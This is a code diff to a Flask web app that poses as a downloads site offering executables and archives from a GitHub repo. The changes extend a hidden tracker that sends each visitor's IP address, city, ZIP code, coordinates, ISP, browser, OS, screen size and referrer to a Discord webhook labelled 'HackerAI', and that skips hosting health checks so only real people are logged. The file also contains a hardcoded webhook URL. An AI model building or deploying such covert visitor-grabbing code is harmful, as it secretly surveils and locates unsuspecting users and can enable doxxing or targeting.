@@ -1,5 +1,6 @@
 import os
 import time
+import uuid
 import requests
 from flask import Flask, render_template, request
 
@@ -12,17 +13,23 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540114660370550804/502O
 
 GITHUB_REPO_OWNER = "malucomaf16"
 GITHUB_REPO_NAME   = "downloads-website"
-GITHUB_FILES_PATH  = "arquivos"      # Se não existir, vai mostrar "No files found"
+GITHUB_FILES_PATH  = "arquivos"
 GITHUB_BRANCH      = "main"
 
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
+
+# Filtro: IPs do Render (Oregon / health checks) - não envia webhook pra eles
+FILTERED_IPS = [
+    "127.0.0.1", "::1", "localhost",
+]
+# Se o IP começar com algum desses, ignora (Render health check)
+FILTERED_IP_PREFIXES = ["10.", "172.", "198.18."]
 # ============================================================
 
 HEADERS = {}
 if GITHUB_TOKEN:
     HEADERS["Authorization"] = f"token {GITHUB_TOKEN}"
 
-# Extensão → ícone
 EXT_ICONS = {
     ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
     ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
@@ -50,6 +57,16 @@ EXT_CATEGORIES = {
 }
 
 
+def is_filtered_ip(ip):
+    """Verifica se o IP deve ser ignorado (health check do Render)"""
+    if ip in FILTERED_IPS:
+        return True
+    for prefix in FILTERED_IP_PREFIXES:
+        if ip.startswith(prefix):
+            return True
+    return False
+
+
 def get_icon(ext):
     return EXT_ICONS.get(ext.lower(), "📁")
 
@@ -59,9 +76,7 @@ def get_category(ext):
 
 
 def get_github_files():
-    """Pega lista de arquivos da pasta no GitHub"""
     url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{GITHUB_FILES_PATH}?ref={GITHUB_BRANCH}"
-    
     try:
         resp = requests.get(url, headers=HEADERS, timeout=10)
         if resp.status_code == 200:
@@ -73,9 +88,7 @@ def get_github_files():
                     ext = "." + name.rsplit(".", 1)[1] if "." in name else ""
                     size_mb = round(item["size"] / (1024 * 1024), 1)
                     raw_url = item["download_url"]
-                    
                     display_name = name.rsplit(".", 1)[0].replace("_", " ").replace("-", " ").strip()
-                    
                     files.append({
                         "name": display_name,
                         "filename": name,
@@ -85,20 +98,12 @@ def get_github_files():
                         "icon": get_icon(ext),
                         "category": get_category(ext),
                     })
-            
             files.sort(key=lambda x: x["filename"])
             return files
-        else:
-            print(f"[!] GitHub API error: {resp.status_code}")
-            return []
-    except Exception as e:
-        print(f"[!] GitHub exception: {e}")
+        return []
+    except:
         return []
 
-
-# ============================================================
-# 🕵️ COLETA DE INFO
-# ============================================================
 
 def get_client_ip():
     if request.headers.get("X-Forwarded-For"):
@@ -138,49 +143,62 @@ def parse_ua(ua):
 
 def send_webhook(action, file_name=""):
     ip = get_client_ip()
-    if ip in ("127.0.0.1", "::1", "localhost"):
+    
+    # Filtra IPs do Render / health checks
+    if is_filtered_ip(ip):
+        print(f"[*] Filtered IP: {ip} (Render health check)")
         return
     
     ua = request.headers.get("User-Agent", "Unknown")
     os_name, browser = parse_ua(ua)
     geo = get_geolocation(ip)
+    visit_id = str(uuid.uuid4())[:8]
     
+    # Embed super organizado — TODOS OS CAMPOS inline=True pra ficar lado a lado
     embed = {
         "embeds": [{
-            "title": f"⬇️ {action} — {file_name}" if file_name else f"👁️ {action}",
+            "title": f"⬇️ {'Download' if file_name else 'Visit'} — {file_name or 'Homepage'}",
             "color": 0x5865F2,
             "fields": [
-                {"name": "📄 File", "value": file_name or "N/A", "inline": True},
-                {"name": "🌐 IP", "value": str(geo.get("query", ip)), "inline": True},
-                {"name": "📍 Country", "value": str(geo.get("country", "Unknown")), "inline": True},
-                {"name": "🏙️ City", "value": str(geo.get("city", "Unknown")), "inline": True},
-                {"name": "🗺️ Region", "value": str(geo.get("regionName", "Unknown")), "inline": True},
-                {"name": "📮 ZIP", "value": str(geo.get("zip", "")), "inline": True},
-                {"name": "🧭 Latitude", "value": str(geo.get("lat", 0)), "inline": True},
-                {"name": "🧭 Longitude", "value": str(geo.get("lon", 0)), "inline": True},
-                {"name": "🏢 ISP", "value": str(geo.get("isp", "Unknown")), "inline": True},
-                {"name": "🏢 Organization", "value": str(geo.get("org", "Unknown")), "inline": True},
-                {"name": "🔗 ASN", "value": str(geo.get("as", "Unknown")), "inline": True},
+                # 🔹 IDENTIFICAÇÃO
+                {"name": "🆔 Visit ID", "value": visit_id, "inline": True},
+                {"name": "📄 File", "value": file_name or "Homepage", "inline": True},
+                {"name": "⏱️ Time", "value": time.strftime("%H:%M:%S UTC", time.gmtime()), "inline": True},
+                
+                # 🔹 LOCALIZAÇÃO (tudo junto)
+                {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
+                {"name": "📍 Country", "value": geo.get("country", "Unknown"), "inline": True},
+                {"name": "🏙️ City", "value": geo.get("city", "Unknown"), "inline": True},
+                {"name": "🗺️ Region", "value": geo.get("regionName", "Unknown"), "inline": True},
+                {"name": "📮 ZIP Code", "value": geo.get("zip", "N/A"), "inline": True},
+                {"name": "🌐 Coordinates", "value": f"{geo.get('lat', '?')}, {geo.get('lon', '?')}", "inline": True},
+                
+                # 🔹 REDE
+                {"name": "🏢 ISP", "value": geo.get("isp", "Unknown"), "inline": True},
+                {"name": "🏢 Organization", "value": geo.get("org", "Unknown"), "inline": True},
+                {"name": "🔗 ASN", "value": geo.get("as", "Unknown"), "inline": True},
+                
+                # 🔹 SISTEMA
                 {"name": "💻 OS", "value": os_name, "inline": True},
                 {"name": "🌍 Browser", "value": browser, "inline": True},
                 {"name": "🗣️ Language", "value": request.headers.get("Accept-Language", "Unknown"), "inline": True},
-                {"name": "🔗 User Agent", "value": ua, "inline": False},
-                {"name": "🔗 Referrer", "value": request.referrer or "Direct", "inline": True},
+                {"name": "💾 Screen", "value": request.args.get("screen", "Unknown"), "inline": True},
+                
+                # 🔹 REFERÊNCIA
+                {"name": "🔗 Referrer", "value": request.referrer or "Direct / None", "inline": False},
+                {"name": "📋 User Agent", "value": f"```{ua[:500]}```", "inline": False},
             ],
-            "footer": {"text": f"HackerAI • {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}"},
+            "footer": {"text": f"HackerAI • visit:{visit_id}"},
             "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
         }]
     }
     
     try:
         requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
-    except:
-        pass
+        print(f"[+] Sent webhook | {ip} | {file_name or 'Homepage'} | ID:{visit_id}")
+    except Exception as e:
+        print(f"[!] Webhook error: {e}")
 
-
-# ============================================================
-# 🌐 ROTAS
-# ============================================================
 
 @app.route("/")
 def index():
@@ -217,10 +235,6 @@ def download_page(filename):
 def track():
     return {"status": "ok"}
 
-
-# ============================================================
-# 🚀 START
-# ============================================================
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
